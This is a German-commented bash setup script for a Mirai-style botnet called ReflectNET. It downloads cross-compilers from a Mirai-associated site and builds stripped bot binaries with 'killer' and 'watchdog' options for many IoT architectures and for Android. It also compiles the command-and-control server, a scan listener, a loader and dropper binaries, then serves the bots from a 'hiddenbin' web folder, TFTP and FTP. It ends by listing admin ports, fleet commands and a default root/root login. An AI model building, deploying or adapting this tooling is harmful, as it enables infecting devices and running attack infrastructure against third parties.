#!/usr/bin/env bash
# ReflectNET — automatisches Setup (Ubuntu 22.04+ / Debian)
# Nutzung:
#   chmod +x setup.sh
#   ./setup.sh                  Schnell: Deps + CNC + native Bot-Build
#   ./setup.sh --full           Alles: Cross-Compiler, alle Architekturen, Web-Deploy
#   ./setup.sh --android        NDK: android-arm + android-arm64 (für APK)
#   ./setup.sh --ip 1.2.3.4     Server-IP in Loader/ScanListen eintragen
#   ./setup.sh --deps-only      Nur Pakete installieren
#   ./setup.sh --build-only     Nur bauen (Deps überspringen)

set -euo pipefail

ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
BIN_DIR="$ROOT/bin"
RELEASE_DIR="$ROOT/release"
DLR_DIR="$ROOT/dlr/release"
LOADER_DIR="$ROOT/loader"
CNC_DIR="$ROOT/cnc"
BOT_DIR="$ROOT/bot"
GEO_DIR="$CNC_DIR/geo"
TOOLCHAIN_DIR="$ROOT/toolchains"
XCOMPILE_DIR="$TOOLCHAIN_DIR"
ANDROID_SDK="${ANDROID_SDK:-/opt/android-sdk}"
ANDROID_NDK_VERSION="${ANDROID_NDK_VERSION:-25.2.9519653}"
GO_VERSION="${GO_VERSION:-1.23.2}"
SERVER_IP="${SERVER_IP:-}"

FULL=0
DEPS_ONLY=0
BUILD_ONLY=0
SKIP_CROSS=0
BUILD_ANDROID=0

log()  { printf '\033[1;36m[setup]\033[0m %s\n' "$*"; }
warn() { printf '\033[1;33m[warn]\033[0m %s\n' "$*"; }
err()  { printf '\033[1;31m[error]\033[0m %s\n' "$*" >&2; }
die()  { err "$@"; exit 1; }

usage() {
    cat <<'EOF'
ReflectNET setup.sh

Optionen:
  --full          Cross-Compiler, alle Bot-Architekturen, Apache/TFTP/FTP-Deploy
  --android       Android NDK: android-arm + android-arm64 (für Juan-APK)
  --ip <addr>     Server-IP für Loader, scanListen, bot/includes.h (Urip-Platzhalter)
  --deps-only     Nur System-Abhängigkeiten installieren
  --build-only    Keine Pakete installieren, nur bauen
  --skip-cross    Keine Cross-Compiler (nur native x86_64 Bot)
  -h, --help      Diese Hilfe

Umgebungsvariablen:
  SERVER_IP             Wie --ip
  GO_VERSION            Go-Version (Standard: 1.23.2)
  ANDROID_SDK           SDK-Pfad (Standard: /opt/android-sdk)
  ANDROID_NDK_VERSION   NDK-Version (Standard: 25.2.9519653)

Beispiele:
  sudo ./setup.sh --full --android --ip 203.0.113.10
  ./setup.sh --build-only --android
  sudo ./setup.sh --android --ip 203.0.113.10
EOF
}

while [[ $# -gt 0 ]]; do
    case "$1" in
        --full)       FULL=1; shift ;;
        --android)    BUILD_ANDROID=1; shift ;;
        --deps-only)  DEPS_ONLY=1; shift ;;
        --build-only) BUILD_ONLY=1; shift ;;
        --skip-cross) SKIP_CROSS=1; shift ;;
        --ip)
            [[ $# -ge 2 ]] || die "--ip braucht eine Adresse"
            SERVER_IP="$2"
            shift 2
            ;;
        -h|--help) usage; exit 0 ;;
        *) die "Unbekannte Option: $1 (siehe --help)" ;;
    esac
done

[[ "$(uname -s)" == "Linux" ]] || die "setup.sh läuft nur unter Linux (Ubuntu 22.04+ empfohlen)."

need_root() {
    [[ "${EUID:-$(id -u)}" -eq 0 ]] || die "Für diesen Schritt root nötig: sudo $0 $*"
}

install_apt_deps() {
    log "Installiere System-Pakete …"
    export DEBIAN_FRONTEND=noninteractive
    apt-get update -y
    apt-get install -y \
        build-essential gcc g++ make \
        git wget curl ca-certificates bzip2 xz-utils unzip zip \
        screen nano \
        libgmp-dev libc6-dev libssl-dev \
        apache2 xinetd tftpd-hpa vsftpd \
        python3 python3-pip \
        binutils \
        openjdk-17-jdk-headless

    if ! ldconfig -p 2>/dev/null | grep -q libgmp.so.3; then
        if [[ -f /usr/lib/x86_64-linux-gnu/libgmp.so.10 ]]; then
            ln -sf /usr/lib/x86_64-linux-gnu/libgmp.so.10 /usr/lib/x86_64-linux-gnu/libgmp.so.3 2>/dev/null || true
        fi
    fi

    log "Pakete installiert."
}

install_go() {
    if command -v go >/dev/null 2>&1; then
        log "Go bereits vorhanden: $(go version)"
        return
    fi

    log "Installiere Go ${GO_VERSION} …"
    local tarball="go${GO_VERSION}.linux-amd64.tar.gz"
    local url="https://go.dev/dl/${tarball}"
    local tmp
    tmp="$(mktemp -d)"
    wget -q "$url" -O "$tmp/$tarball"
    rm -rf /usr/local/go
    tar -C /usr/local -xzf "$tmp/$tarball"
    rm -rf "$tmp"

    export PATH="/usr/local/go/bin:$PATH"
    export GOROOT=/usr/local/go
    grep -q '/usr/local/go/bin' /etc/profile.d/reflectnet-go.sh 2>/dev/null || \
        echo 'export PATH=$PATH:/usr/local/go/bin' > /etc/profile.d/reflectnet-go.sh

    log "Go installiert: $(/usr/local/go/bin/go version)"
}

export_go_env() {
    export PATH="/usr/local/go/bin:${PATH:-}"
    export GOROOT="${GOROOT:-/usr/local/go}"
    command -v go >/dev/null 2>&1 || die "Go nicht gefunden. Bitte install_go ausführen oder Go manuell installieren."
}

install_cross_compiler_one() {
    local name="$1" url="$2" folder="$3" target="$4"
    local ext="${url##*.}"
    local archive="/tmp/reflectnet-${name}.${ext}"

    if [[ -d "$XCOMPILE_DIR/$target/bin" ]] || [[ -x "$XCOMPILE_DIR/$target/bin/${target}-gcc" ]] || [[ -x "$XCOMPILE_DIR/arc/bin/arc-linux-gcc" && "$target" == "arc" ]]; then
        log "  $target — bereits vorhanden, überspringe"
        return 0
    fi

    log "  Lade $target …"
    if ! wget -q --timeout=60 --tries=2 "$url" -O "$archive"; then
        warn "Download fehlgeschlagen: $target"
        rm -f "$archive"
        return 1
    fi

    local tar_ok=0
    case "$archive" in
        *.tar.bz2|*.tbz2) tar -xjf "$archive" -C "$XCOMPILE_DIR" 2>/dev/null && tar_ok=1 ;;
        *.tar.gz|*.tgz)   tar -xzf "$archive" -C "$XCOMPILE_DIR" 2>/dev/null && tar_ok=1 ;;
        *)                tar -xf "$archive" -C "$XCOMPILE_DIR" 2>/dev/null && tar_ok=1 ;;
    esac

    if [[ "$tar_ok" -ne 1 ]]; then
        warn "Archiv ungültig oder defekt: $target ($url)"
        rm -f "$archive"
        return 1
    fi

    if [[ -d "$XCOMPILE_DIR/$folder" && "$folder" != "$target" ]]; then
        mv "$XCOMPILE_DIR/$folder" "$XCOMPILE_DIR/$target"
    fi
    rm -f "$archive"
    return 0
}

install_cross_compilers() {
    need_root
    log "Installiere Cross-Compiler (mirailovers.io) nach ${XCOMPILE_DIR} …"
    mkdir -p "$XCOMPILE_DIR"
    cd "$XCOMPILE_DIR"

    local base="https://mirailovers.io/HELL-ARCHIVE/COMPILERS"

    install_cross_compiler_one "x86_64" "${base}/cross-compiler-x86_64.tar.bz2" "cross-compiler-x86_64" "x86_64" || true
    install_cross_compiler_one "i586" "${base}/cross-compiler-i586.tar.bz2" "cross-compiler-i586" "i586" || true
    install_cross_compiler_one "i686" "${base}/cross-compiler-i686.tar.bz2" "cross-compiler-i686" "i686" || true
    install_cross_compiler_one "m68k" "${base}/cross-compiler-m68k.tar.bz2" "cross-compiler-m68k" "m68k" || true
    install_cross_compiler_one "mips" "${base}/cross-compiler-mips.tar.bz2" "cross-compiler-mips" "mips" || true
    install_cross_compiler_one "mipsel" "${base}/cross-compiler-mipsel.tar.bz2" "cross-compiler-mipsel" "mipsel" || true
    install_cross_compiler_one "powerpc" "${base}/cross-compiler-powerpc.tar.bz2" "cross-compiler-powerpc" "powerpc" || true
    install_cross_compiler_one "sh4" "${base}/cross-compiler-sh4.tar.bz2" "cross-compiler-sh4" "sh4" || true
    install_cross_compiler_one "sparc" "${base}/cross-compiler-sparc.tar.bz2" "cross-compiler-sparc" "sparc" || true
    install_cross_compiler_one "armv4l" "${base}/cross-compiler-armv4l.tar.bz2" "cross-compiler-armv4l" "armv4l" || true
    install_cross_compiler_one "armv5l" "${base}/cross-compiler-armv5l.tar.bz2" "cross-compiler-armv5l" "armv5l" || true
    install_cross_compiler_one "armv6l" "${base}/cross-compiler-armv6l.tar.bz2" "cross-compiler-armv6l" "armv6l" || true
    install_cross_compiler_one "armv7l" "${base}/cross-compiler-armv7l.tar.bz2" "cross-compiler-armv7l" "armv7l" || true

    # ARC optional — nicht auf mirailovers, nur GitHub
    install_cross_compiler_one "arc" \
        "https://github.com/foss-for-synopsys-dwc-arc-processors/toolchain/releases/download/arc-2017.09-release/arc_gnu_2017.09_prebuilt_uclibc_le_arc700_linux_install.tar.gz" \
        "arc_gnu_2017.09_prebuilt_uclibc_le_arc700_linux_install" "arc" || \
        warn "ARC-Compiler übersprungen (optional)"

    cd "$ROOT"
    log "Cross-Compiler Installation abgeschlossen."
}

export_cross_path() {
    local d
    for d in "$XCOMPILE_DIR"/*/bin "$XCOMPILE_DIR"/arc/bin; do
        [[ -d "$d" ]] && export PATH="$PATH:$d"
    done
}

configure_server_ip() {
    [[ -n "$SERVER_IP" ]] || return 0
    log "Setze Server-IP auf $SERVER_IP …"

    local ip_commas="${SERVER_IP//./,}"
    local files=(
        "$LOADER_DIR/src/headers/config.h"
        "$LOADER_DIR/src/main.c"
        "$ROOT/scanListen.go"
        "$BOT_DIR/headers/includes.h"
    )

    local f
    for f in "${files[@]}"; do
        [[ -f "$f" ]] || continue
        sed -i "s/Urip/${SERVER_IP}/g" "$f"
    done

    if [[ -f "$ROOT/dlr/main.c" ]]; then
        if grep -q 'utils_inet_addr(Urip)' "$ROOT/dlr/main.c" 2>/dev/null; then
            sed -i "s/Urip/${ip_commas}/g" "$ROOT/dlr/main.c"
        elif grep -q "utils_inet_addr(${SERVER_IP})" "$ROOT/dlr/main.c" 2>/dev/null; then
            sed -i "s/utils_inet_addr(${SERVER_IP})/utils_inet_addr(${ip_commas})/g" "$ROOT/dlr/main.c"
        fi
    fi

    warn "CNC-Domain in bot/table.c ist verschlüsselt — ggf. manuell anpassen."
    warn "manifest.json Redirect-Host in cnc/ prüfen."
}

BOT_CFLAGS="-std=c99 -O3 -fomit-frame-pointer -fdata-sections -ffunction-sections -Wl,--gc-sections -pthread"
BOT_DEFS="-DKILLER -DWATCHDOG -DBOT_VERSION=3"
BOT_SOURCES=("$BOT_DIR"/*.c)
STRIP_FLAGS="-S --strip-unneeded --remove-section=.note.gnu.gold-version --remove-section=.comment --remove-section=.note --remove-section=.note.gnu.build-id --remove-section=.note.ABI-tag --remove-section=.jcr --remove-section=.got.plt --remove-section=.eh_frame --remove-section=.eh_frame_ptr --remove-section=.eh_frame_hdr"

compile_bot_arch() {
    local cc="$1" strip="$2" out="$3" extra="${4:-}"
    if ! command -v "$cc" >/dev/null 2>&1; then
        warn "  $cc fehlt — überspringe $out"
        return 1
    fi
    log "  Bot → $out"
    if ! "$cc" $BOT_CFLAGS $extra "${BOT_SOURCES[@]}" -o "$RELEASE_DIR/$out" $BOT_DEFS -lpthread; then
        warn "  Build fehlgeschlagen: $out"
        return 1
    fi
    if command -v "$strip" >/dev/null 2>&1; then
        "$strip" "$RELEASE_DIR/$out" $STRIP_FLAGS 2>/dev/null || true
    fi
    return 0
}

strip_bot_bom() {
    local f first
    for f in "$BOT_DIR"/*.c; do
        [[ -f "$f" ]] || continue
        first="$(head -c 3 "$f" 2>/dev/null | od -An -tx1 | tr -d ' \n')"
        if [[ "$first" == "efbbbf" ]]; then
            warn "UTF-8 BOM entfernt: $(basename "$f")"
            tail -c +4 "$f" > "${f}.nobom" && mv "${f}.nobom" "$f"
        fi
    done
}

build_bots() {
    mkdir -p "$RELEASE_DIR"
    log "Baue Bot-Binaries …"
    strip_bot_bom

    if [[ "$FULL" -eq 1 && "$SKIP_CROSS" -eq 0 ]]; then
        export_cross_path
        compile_bot_arch arc-linux-gcc arc-linux-strip arc "-static" || true
        compile_bot_arch i586-gcc i586-strip x86 "-static" || true
        compile_bot_arch x86_64-gcc x86_64-strip x86_64 "-static" || true
        compile_bot_arch i686-gcc i686-strip i686 "-static" || true
        compile_bot_arch mips-gcc mips-strip mips "-static" || true
        compile_bot_arch mipsel-gcc mipsel-strip mipsel "-static" || true
        compile_bot_arch armv4l-gcc armv4l-strip arm "-static" || true
        compile_bot_arch armv5l-gcc armv5l-strip arm5 "" || true
        compile_bot_arch armv6l-gcc armv6l-strip arm6 "-static" || true
        compile_bot_arch armv7l-gcc armv7l-strip arm7 "-static" || true
        compile_bot_arch powerpc-gcc powerpc-strip ppc "-static" || true
        compile_bot_arch sparc-gcc sparc-strip sparc "-static" || true
        compile_bot_arch m68k-gcc m68k-strip m68k "-static" || true
        compile_bot_arch sh4-gcc sh4-strip sh4 "-static" || true
    else
        log "  Native x86_64 (Debug/Test-Build) …"
        gcc $BOT_CFLAGS -static "${BOT_SOURCES[@]}" -o "$RELEASE_DIR/x86_64" $BOT_DEFS
        strip "$RELEASE_DIR/x86_64" $STRIP_FLAGS 2>/dev/null || true
        if [[ "$FULL" -eq 0 ]]; then
            warn "Nur x86_64 gebaut. Für alle Architekturen: sudo ./setup.sh --full"
        fi
    fi

    log "Bot-Build fertig → $RELEASE_DIR/"
    ls -lh "$RELEASE_DIR"/ 2>/dev/null || true
}

# ─── Android NDK (android-arm / android-arm64 for APK) ───────

install_android_ndk() {
    local cmdline="$ANDROID_SDK/cmdline-tools/latest"
    local ndk_root="$ANDROID_SDK/ndk/$ANDROID_NDK_VERSION"
    local ndk_bin="$ndk_root/toolchains/llvm/prebuilt/linux-x86_64/bin"

    log "Android SDK/NDK ($ANDROID_SDK) …"
    mkdir -p "$ANDROID_SDK"

    if [[ ! -f "$cmdline/bin/sdkmanager" ]]; then
        log "  Lade Android cmdline-tools …"
        local zip="/tmp/android-cmdtools.zip"
        local tmp="/tmp/android-cmdtools-$$"
        wget -q "https://dl.google.com/android/repository/commandlinetools-linux-11076708_latest.zip" -O "$zip"
        rm -rf "$tmp"
        mkdir -p "$tmp" "$cmdline"
        unzip -q "$zip" -d "$tmp"
        mv "$tmp"/cmdline-tools/* "$cmdline/"
        rm -rf "$zip" "$tmp"
    fi

    export ANDROID_HOME="$ANDROID_SDK"
    export PATH="$cmdline/bin:$PATH"

    if [[ ! -d "$ndk_bin" ]]; then
        log "  Installiere NDK $ANDROID_NDK_VERSION …"
        yes | "$cmdline/bin/sdkmanager" --sdk_root="$ANDROID_SDK" \
            "ndk;$ANDROID_NDK_VERSION" "platforms;android-34" "build-tools;34.0.0" "platform-tools" \
            2>&1 | grep -E 'Downloading|Installing|Done|ndk' | head -20 || true
        yes | "$cmdline/bin/sdkmanager" --sdk_root="$ANDROID_SDK" --licenses >/dev/null 2>&1 || true
    fi

    if [[ ! -d "$ndk_bin" ]]; then
        warn "NDK nicht gefunden unter $ndk_bin"
        return 1
    fi
    log "  NDK OK → $ndk_root"
    return 0
}

build_android_bots() {
    local ndk_root ndk_bin llvm_strip
    local cflags defs srcs
    local cc32 cc64

    mkdir -p "$RELEASE_DIR"
    strip_bot_bom

    ndk_root="$ANDROID_SDK/ndk/$ANDROID_NDK_VERSION"
    # Prefer newest installed NDK if exact version missing
    if [[ ! -d "$ndk_root/toolchains/llvm/prebuilt/linux-x86_64/bin" ]]; then
        local latest
        latest="$(ls "$ANDROID_SDK/ndk" 2>/dev/null | sort -V | tail -1 || true)"
        [[ -n "$latest" ]] && ndk_root="$ANDROID_SDK/ndk/$latest"
    fi
    ndk_bin="$ndk_root/toolchains/llvm/prebuilt/linux-x86_64/bin"
    if [[ ! -d "$ndk_bin" ]]; then
        if ! install_android_ndk; then
            warn "Android-Build übersprungen (kein NDK)"
            return 1
        fi
        ndk_root="$ANDROID_SDK/ndk/$ANDROID_NDK_VERSION"
        ndk_bin="$ndk_root/toolchains/llvm/prebuilt/linux-x86_64/bin"
    fi

    log "Baue Android-Bots (NDK) …"
    llvm_strip="$ndk_bin/llvm-strip"
    # PIE executable (Juan execs libbot.so directly). No KILLER/WATCHDOG.
    cflags="-std=c99 -O3 -fPIE -pie -fomit-frame-pointer -fdata-sections -ffunction-sections"
    cflags="$cflags -I$BOT_DIR -I$BOT_DIR/android_sysroot"
    cflags="$cflags -include $BOT_DIR/headers/android_compat.h"
    cflags="$cflags -Wno-unused-variable -Wno-unused-parameter -Wno-unused-function"
    cflags="$cflags -Wno-macro-redefined -Wno-incompatible-pointer-types-discards-qualifiers"
    defs="-DANDROID -DBOT_VERSION=3"
    # shellcheck disable=SC2206
    srcs=("$BOT_DIR"/*.c)

    cc32="$ndk_bin/armv7a-linux-androideabi21-clang"
    cc64="$ndk_bin/aarch64-linux-android21-clang"

    if [[ -x "$cc32" ]]; then
        log "  Bot → android-arm (armeabi-v7a)"
        if "$cc32" $cflags "${srcs[@]}" -o "$RELEASE_DIR/android-arm" $defs -pthread; then
            [[ -x "$llvm_strip" ]] && "$llvm_strip" "$RELEASE_DIR/android-arm" 2>/dev/null || true
            ls -lh "$RELEASE_DIR/android-arm"
        else
            warn "  android-arm Build fehlgeschlagen"
        fi
    else
        warn "  $cc32 fehlt"
    fi

    if [[ -x "$cc64" ]]; then
        log "  Bot → android-arm64 (arm64-v8a)"
        if "$cc64" $cflags "${srcs[@]}" -o "$RELEASE_DIR/android-arm64" $defs -pthread; then
            [[ -x "$llvm_strip" ]] && "$llvm_strip" "$RELEASE_DIR/android-arm64" 2>/dev/null || true
            ls -lh "$RELEASE_DIR/android-arm64"
        else
            warn "  android-arm64 Build fehlgeschlagen"
        fi
    else
        warn "  $cc64 fehlt"
    fi

    log "Android-Bins → $RELEASE_DIR/android-arm{,64}"
    log "Für Juan-APK: cp $RELEASE_DIR/android-arm* /path/to/Juan/bins/ && cd Juan && ./run.sh"
}

build_cnc() {
    mkdir -p "$BIN_DIR" "$GEO_DIR"
    log "Baue CNC …"
    export_go_env
    cd "$CNC_DIR"
    go mod download
    go build -o "$BIN_DIR/cnc" .
    cp -f manifest.json "$BIN_DIR/manifest.json" 2>/dev/null || true
    cd "$ROOT"
    log "CNC → $BIN_DIR/cnc"
}

build_scanlisten() {
    [[ -f "$ROOT/scanListen.go" ]] || return 0
    log "Baue scanListen …"
    export_go_env
    cd "$ROOT"
    go build -o "$BIN_DIR/scanListen" scanListen.go
    log "scanListen → $BIN_DIR/scanListen"
}

build_loader() {
    [[ -d "$LOADER_DIR/src" ]] || return 0
    log "Baue Loader …"
    gcc -static -O3 -lpthread -pthread "$LOADER_DIR"/src/*.c -o "$BIN_DIR/loader"
    log "Loader → $BIN_DIR/loader"
}

build_dlr() {
    [[ "$FULL" -eq 0 ]] && return 0
    [[ -f "$ROOT/dlr/main.c" ]] || return 0

    export_cross_path
    mkdir -p "$DLR_DIR" "$LOADER_DIR/bins"
    log "Baue DLR (Dropper) …"

    local -a specs=(
        "x86_64 x86 x86_64"
        "armv4l arm ARM"
        "armv5l arm5 ARM"
        "armv6l arm6 ARM"
        "armv7l arm7 ARM"
        "i586 x86 X32"
        "m68k m68k M68K"
        "mips mips MIPS"
        "mipsel mipsel MIPSEL"
        "powerpc ppc PPC"
        "sh4 sh4 SH4"
        "sparc sparc SPARC"
    )

    local spec cc arch flag out
    for spec in "${specs[@]}"; do
        read -r cc arch flag <<<"$spec"
        out="dlr.${arch}"
        if ! command -v "${cc}-gcc" >/dev/null 2>&1; then
            warn "  ${cc}-gcc fehlt — überspringe $out"
            continue
        fi
        "${cc}-gcc" -Os -D BOT_ARCH=\"${arch}\" -D "${flag}" \
            -Wl,--gc-sections -fdata-sections -ffunction-sections \
            -e __start -nostartfiles -static "$ROOT/dlr/main.c" -o "$DLR_DIR/$out"
        command -v "${cc}-strip" >/dev/null 2>&1 && "${cc}-strip" "$DLR_DIR/$out" $STRIP_FLAGS 2>/dev/null || true
        cp -f "$DLR_DIR/$out" "$LOADER_DIR/bins/$out"
    done
    log "DLR → $DLR_DIR/"
}

deploy_web() {
    [[ "$FULL" -eq 1 ]] || return 0
    need_root

    log "Deploy nach Apache / TFTP / FTP …"
    local web="/var/www/html"
    local tftp="/var/lib/tftpboot"
    local ftp="/var/ftp"

    mkdir -p "$web/hiddenbin" "$tftp" "$ftp"
    cp -f "$RELEASE_DIR"/* "$web/hiddenbin/" 2>/dev/null || true
    cp -f "$RELEASE_DIR"/* "$tftp/" 2>/dev/null || true
    cp -f "$RELEASE_DIR"/* "$ftp/" 2>/dev/null || true
    [[ -f "$ROOT/api.php" ]] && cp -f "$ROOT/api.php" "$web/"

    systemctl enable apache2 tftpd-hpa vsftpd 2>/dev/null || true
    systemctl restart apache2 tftpd-hpa vsftpd 2>/dev/null || true

    log "Bins unter $web/hiddenbin/, $tftp/, $ftp/"
}

setup_ulimit() {
    log "Setze ulimit (aktuelle Shell) …"
    ulimit -n 999999 2>/dev/null || warn "ulimit -n fehlgeschlagen"
    ulimit -u 999999 2>/dev/null || true
}

write_start_script() {
    cat > "$BIN_DIR/start.sh" <<'EOF'
#!/usr/bin/env bash
# ReflectNET — CNC starten (database.json muss hier liegen: /root/bin/)
cd "$(dirname "$0")"
ulimit -n 999999 2>/dev/null || true

if ss -tlnp 2>/dev/null | grep -q ':1234 '; then
    echo "CNC läuft bereits auf Port 1234"
    ss -tlnp | grep ':1234 '
    exit 0
fi

echo "Admin-Telnet: Port 1234 | Bot-Port: 3778 | API: 3779"
exec ./cnc
EOF
    chmod +x "$BIN_DIR/start.sh"

    cat > "$BIN_DIR/start-scanlisten.sh" <<'EOF'
#!/usr/bin/env bash
cd "$(dirname "$0")"
exec ./scanListen
EOF
    chmod +x "$BIN_DIR/start-scanlisten.sh"
}

print_done() {
    cat <<EOF

\033[1;32m══════════════════════════════════════════\033[0m
\033[1;32m ReflectNET Setup abgeschlossen\033[0m
\033[1;32m══════════════════════════════════════════\033[0m

  CNC starten:     cd $BIN_DIR && ./start.sh
                   (oder: screen -S cnc $BIN_DIR/start.sh)

  scanListen:      cd $BIN_DIR && ./start-scanlisten.sh

  Bot-Binaries:    $RELEASE_DIR/
  Android (APK):   $RELEASE_DIR/android-arm
                   $RELEASE_DIR/android-arm64
                   (bauen mit: ./setup.sh --android)
                   → nach Juan/bins/ kopieren, dann ./run.sh

  manifest.json:   $CNC_DIR/manifest.json

  Ports:
    Bot-CNC (Telnet Admin): 1234
    HTTP API:               3779
    Bot-Verbindung:         3778 (table.c)

  Fleet-Befehle (Admin):
    fleet stats | fleet redirect all | fleet update all
    fleet reload all | fleet stop | fleet kill all

  Optional — GeoIP (Länder/ASN in Admin):
    mkdir -p $GEO_DIR
    # Country.mmdb + Asn.mmdb von MaxMind nach $GEO_DIR/

  Hinweis: Erster Admin-Login root/root wird in database.json angelegt.
EOF
}

# ─── Main ────────────────────────────────────────────────────

log "ReflectNET Setup — $ROOT"

[[ -d "$BOT_DIR" ]] || die "bot/ nicht gefunden. Bitte komplettes ReflectNET-Verzeichnis hochladen (nicht nur setup.sh)."
[[ -d "$CNC_DIR" ]] || die "cnc/ nicht gefunden."
[[ -f "$BOT_DIR/main.c" ]] || die "bot/main.c fehlt — unvollständiges Projekt."

if [[ "$BUILD_ONLY" -eq 0 ]]; then
    if [[ "${EUID:-$(id -u)}" -eq 0 ]]; then
        install_apt_deps
        install_go
        [[ "$FULL" -eq 1 && "$SKIP_CROSS" -eq 0 ]] && install_cross_compilers
        [[ "$BUILD_ANDROID" -eq 1 || "$FULL" -eq 1 ]] && install_android_ndk || true
    else
        warn "Ohne root werden keine Pakete installiert."
        warn "Für vollständiges Setup: sudo ./setup.sh --full --android"
        export_go_env 2>/dev/null || true
    fi
fi

[[ "$DEPS_ONLY" -eq 1 ]] && { log "Nur Deps — fertig."; exit 0; }

configure_server_ip
setup_ulimit
build_cnc
build_scanlisten
build_bots
[[ "$BUILD_ANDROID" -eq 1 || "$FULL" -eq 1 ]] && build_android_bots || true
build_loader
build_dlr
deploy_web
write_start_script
print_done
